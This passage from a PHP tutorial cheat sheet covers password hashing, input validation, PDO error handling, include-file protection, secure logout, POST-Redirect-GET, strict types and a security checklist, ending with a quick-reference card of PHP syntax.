| **Built into PHP** | No libraries needed — `password_hash()` + `password_verify()` |

#### Cost Value Guide

| Cost | Iterations | Speed | Use When |
|:---|:---|:---|:---|
| 10 | 1,024 | Fast | Development/testing |
| 12 | 4,096 | Moderate | **Production (recommended)** |
| 14+ | 16,384+ | Slow | High-security applications |

> **Tip:** Use `PASSWORD_DEFAULT` instead of `PASSWORD_BCRYPT` — it auto-upgrades to the best algorithm when PHP updates. Store `pwd VARCHAR(255)` to accommodate future algorithms.

#### Salt & Pepper (General Hashing)

For non-password hashing (tokens, checksums), you can use `hash()` with a salt and pepper:

```php
<?php
$data = "SensitiveData";
$salt = bin2hex(random_bytes(16));   // Random, stored alongside the hash in DB
$pepper = "AppSecretString";          // Secret, stored in code or .env file

$hash = hash("sha256", $data . $salt . $pepper);
?>
```

| Term | What | Where Stored |
|:---|:---|:---|
| **Salt** | Random string, unique per record | Database (next to the hash) |
| **Pepper** | Application-wide secret | Code or environment variable |
| **Hash** | One-way encrypted result | Database |

> **For passwords, always use `password_hash()`.** The `hash()` + salt/pepper method is for general-purpose hashing only.

---

### 22.5 Input Validation

#### Why Validate?

Never trust user input. Users can submit empty fields, invalid emails, or malicious data. Validation catches bad data **before** it reaches your database or gets displayed.

#### Validation Functions Used in This Tutorial

**1. Check for empty fields:**

```php
<?php
function is_input_empty(string $username, string $pwd, string $email) {
    return empty($username) || empty($pwd) || empty($email);
}
// empty() returns true for: "", 0, null, false, [], "0"
?>
```

**2. Validate email format:**

```php
<?php
function is_email_invalid(string $email) {
    return !filter_var($email, FILTER_VALIDATE_EMAIL);
}
// filter_var() checks if the email has a valid format (user@domain.com)
// Returns the email if valid, false if invalid
?>
```

**3. Check for duplicates (username/email already taken):**

```php
<?php
function is_username_taken(object $pdo, string $username) {
    return (bool) get_username($pdo, $username);  // Calls Model to query DB
}
// Prevents two users from registering with the same username
?>
```

#### Validation Summary

| Check | Function | Prevents |
|:---|:---|:---|
| Empty fields | `empty()` | Blank form submissions |
| Invalid email | `filter_var($email, FILTER_VALIDATE_EMAIL)` | Fake/malformed emails |
| Duplicate username | Query DB + check result | Two accounts with same name |
| Duplicate email | Query DB + check result | Two accounts with same email |

---

### 22.6 Error Handling with `try/catch`

#### Why?

Without error handling, a database failure crashes your page with ugly PHP errors that reveal sensitive information (database name, file paths, query structure). `try/catch` lets you handle errors gracefully.

```php
<?php
try {
    $pdo = new PDO($dsn, $dbusername, $dbpassword);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    // ERRMODE_EXCEPTION makes PDO throw exceptions on errors
    // Without this, PDO silently returns false and you'd never know the query failed
} catch (PDOException $e) {
    // Development: show the error
    die("Connection failed: " . $e->getMessage());

    // Production: log it and show a generic message
    // error_log("DB Error: " . $e->getMessage());
    // die("Something went wrong. Please try again later.");
}
?>
```

| PDO Error Mode | Behavior | Use |
|:---|:---|:---|
| `ERRMODE_SILENT` | Silently fails — you must check manually | Never |
| `ERRMODE_WARNING` | PHP warning, script continues | Rarely |
| `ERRMODE_EXCEPTION` | Throws catchable exception | **Always** |

> **Production Rule:** Never show database error details to users. Log them to a file and show a friendly message.

---

### 22.7 File Organization for Security

#### The `includes/` Pattern

```
project/
├── index.php              ← Public pages (users visit these)
├── login.php
└── includes/              ← Private files (never visited directly)
    ├── dbh.inc.php        ← Database connection
    ├── config_session.inc.php ← Session security config
    ├── signup.inc.php     ← Form handler
    ├── signup_contr.inc.php ← Validation logic
    └── signup_model.inc.php ← Database queries
```

| Convention | Meaning |
|:---|:---|
| `.inc.php` suffix | Signals "this file is meant to be included, not visited directly" |
| `includes/` folder | Keeps utility files separate from public pages |
| `require_once` | Includes the file exactly once; fatal error if missing |

#### Block Direct Access

```apache
# includes/.htaccess — prevents browser access to include files
Deny from all
```

> Without this, someone could visit `yoursite.com/includes/dbh.inc.php` and potentially see error messages that reveal your database credentials.

---

### 22.8 Secure Logout (Proper Session Destruction)

#### Why Just `session_destroy()` Isn't Enough

`session_destroy()` only destroys the session on the **server**. The session **cookie** still exists in the user's browser. If an attacker has the cookie, they could still use it.

#### The Complete Logout Pattern

```php
<?php
// 1. Use the SAME cookie params as when the session was created
session_set_cookie_params([
    'lifetime' => 1800,
    'domain'   => 'localhost',
    'path'     => '/',
    'secure'   => true,
    'httponly'  => true
]);

// 2. Resume the session
session_start();

// 3. Clear all session data
session_unset();

// 4. Destroy the session on the server
session_destroy();

// 5. Delete the cookie from the browser
setcookie(session_name(), '', time() - 3600, '/', 'localhost', true, true);

// 6. Redirect
header("Location: ../index.php");
die();
?>
```

| Step | Function | What It Does |
|:---|:---|:---|
| 1 | `session_set_cookie_params()` | Must match the params used to CREATE the session |
| 2 | `session_start()` | Resumes the existing session so we can destroy it |
| 3 | `session_unset()` | Clears all `$_SESSION` variables |
| 4 | `session_destroy()` | Deletes the session file on the server |
| 5 | `setcookie(..., time()-3600)` | Tells the browser to delete the cookie (past expiry date) |

> **Key Lesson:** The logout `session_set_cookie_params()` **must match** the one used in your config. If they differ, `session_start()` creates a NEW empty session instead of resuming the old one — and the old session never gets destroyed.

---

### 22.9 POST-Redirect-GET Pattern (PRG)

#### Why?

If a user submits a form (POST) and you display the result on the same page, refreshing the page **re-submits the form**. This can cause duplicate database entries.

#### How It Works

```
1. User submits form → POST to handler.php
2. Handler processes data → INSERT into database
3. Handler redirects → header("Location: success.php") + die()
4. Browser loads success.php via GET
5. Refreshing the page only re-GETs — no duplicate submission
```

```php
<?php
// handler.php — always redirect after processing
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Process data...
    $stmt->execute([$username, $pwd, $email]);

    // Redirect (switches from POST to GET)
    header("Location: ../form.php?signup=success");
    die();  // MUST come after header()
}
?>
```

#### Flash Messages with Sessions

Errors and success messages are passed via `$_SESSION` (not URL params) and cleared after display:

```php
<?php
// In handler (after validation fails):
$_SESSION["errors_signup"] = ["empty_input" => "Please fill in all fields!"];
header("Location: ../index.php");
die();

// In view (on the form page):
if (isset($_SESSION["errors_signup"])) {
    foreach ($_SESSION["errors_signup"] as $error) {
        echo "<p>" . $error . "</p>";
    }
    unset($_SESSION["errors_signup"]);  // Clear after display — "flash" message
}
?>
```

> **Why sessions for errors?** URL params are visible and manipulable. Sessions store arrays (multiple errors at once) and `unset()` makes them disappear after one display.

---

### 22.10 Type Safety with `declare(strict_types=1)`

#### Why?

PHP normally converts types silently — a string `"5"` passed to a function expecting `int` works without error. This can mask bugs. Strict types force PHP to throw a `TypeError` when types don't match.

```php
<?php
declare(strict_types=1);  // Must be the VERY FIRST line of the file

function add(int $a, int $b): int {
    return $a + $b;
}

add(5, 3);     // ✅ Works
add("5", "3"); // ❌ TypeError — strict mode rejects string-to-int coercion
?>
```

#### Union Types (PHP 8+)

When a function can legitimately return different types:

```php
<?php
// PDO::fetch() returns false (bool) if no row, or an array if found
function is_username_wrong(bool|array $result) {
    return !$result;  // false = user not found
}
?>
```

---

### 22.11 Security Checklist

| Threat | Prevention | PHP Tool |
|:---|:---|:---|
| **SQL Injection** | Prepared statements with placeholders | `$pdo->prepare()` + `bindParam()` / `execute([])` |
| **XSS** | Escape output before displaying in HTML | `htmlspecialchars()` |
| **Session Hijacking** | Secure cookies + periodic ID regeneration | `session_set_cookie_params()` + `session_regenerate_id()` |
| **Session Fixation** | Reject unknown IDs + regenerate on login | `use_strict_mode` + `session_regenerate_id(true)` |
| **Password Exposure** | Hash passwords before storing | `password_hash()` + `password_verify()` |
| **Empty/Invalid Input** | Validate all form data server-side | `empty()` + `filter_var()` |
| **Direct File Access** | Block access to include files | `.htaccess` + `includes/` folder |
| **Error Information Leak** | Catch errors, show generic messages | `try/catch` + `error_log()` |
| **Form Double Submit** | POST-Redirect-GET pattern | `header("Location: ...")` + `die()` |
| **Type Confusion** | Strict types in functions | `declare(strict_types=1)` |

> **Remember:** Security is not a single step — it's applied at **every layer**: input validation → prepared statements → password hashing → session security → output escaping → error handling.

---

## 📌 Quick Reference Card

```
<?php ... ?>           → PHP tags
echo "text";           → Print output
$var = value;          → Variable
// comment             → Single-line comment
/* comment */          → Multi-line comment

── Superglobals ──────────────────────
$_SERVER["KEY"]        → Server info
$_GET["key"]           → URL query data
$_POST["key"]          → Form POST data
$_SESSION["key"]       → Server-side session
$_COOKIE["key"]        → Browser cookie

── Output & Sanitization ─────────────
htmlspecialchars($x)   → Sanitize output for browser
filter_input(...)      → Sanitize input at source
filter_var($x, FILTER) → Validate/sanitize data

── Navigation & Flow ─────────────────
header("Location: x")  → Redirect
exit() / die()         → Stop script execution
require_once "file"    → Include file (fatal if missing)
include "file"         → Include file (warning if missing)

── Debugging ─────────────────────────
var_dump($x)           → Show type + value
print_r($arr)          → Show array contents

── Strings ───────────────────────────
.                      → Concatenation
strlen() / strpos()    → Length / find position
str_replace(o,n,str)   → Replace text
strtolower/strtoupper  → Change case
substr() / explode()   → Extract / split

── Arithmetic ────────────────────────
+  -  *  /  %  **      → Math operators
abs() / round() / sqrt → Math functions
rand($min, $max)       → Random number

── Comparison ────────────────────────
==  ===  !=  !==  <>   → Comparison operators
&&  ||  !              → Logical operators (use these)
and  or                → Logical (lower precedence)

── Increment / Decrement ─────────────
++$a / $a++            → Increment (pre / post)
--$a / $a--            → Decrement (pre / post)

── Control Flow ──────────────────────
if / else if / else    → Conditional branching
switch ($x) { case: }  → Match value against many
match ($x) { val => }  → Strict match (PHP 8+)

── Loops ─────────────────────────────
for ($i=0; $i<n; $i++) → Count-based loop
while (cond) { }       → Condition-based loop
do { } while (cond)    → Runs at least once
foreach ($a as $v)     → Iterate array elements

── Arrays ────────────────────────────
count($arr)            → Number of elements
array_push($a, $v)     → Add to end
array_splice($a,i,n)   → Remove/insert & re-index
sort() / asort()       → Sort (drop keys / keep keys)

── Functions ─────────────────────────
function name() {}     → Define a function
return $value;         → Return from function
declare(strict_types=1)→ Enforce type safety

── Scope ─────────────────────────────
global $var            → Access global inside function
static $var            → Persist value between calls
define("NAME", val)    → Define a constant
const NAME = val       → Define constant (compile-time)

── Date & Time ───────────────────────
date("Y-m-d")          → Current date formatted
time() / strtotime()   → Unix timestamp / parse date

── Sessions ──────────────────────────
session_start()        → Start/resume session
session_unset()        → Clear all session variables
session_destroy()      → Destroy session (next page)
session_regenerate_id()→ New session ID (security)
session_set_cookie_params([...]) → Secure cookie config

── Password Hashing ──────────────────
password_hash($pwd, ALGO)     → Hash password (signup)
password_verify($pwd, $hash)  → Check password (login)

── Database (PDO) ────────────────────
$pdo = new PDO($dsn, $u, $p) → Connect
$pdo->prepare($query)         → Prepare statement
$stmt->bindParam(":x", $var)  → Bind parameter
$stmt->execute()               → Run query
$stmt->fetch(PDO::FETCH_ASSOC) → Get one row
$stmt->fetchAll(PDO::FETCH_ASSOC) → Get all rows
$pdo = null; $stmt = null      → Close connection
```

---

> **🚀 Keep Learning!** This cheat sheet covers PHP fundamentals through sessions, security, hashing, and a complete login system. Next up: OOP, file uploads, and more!
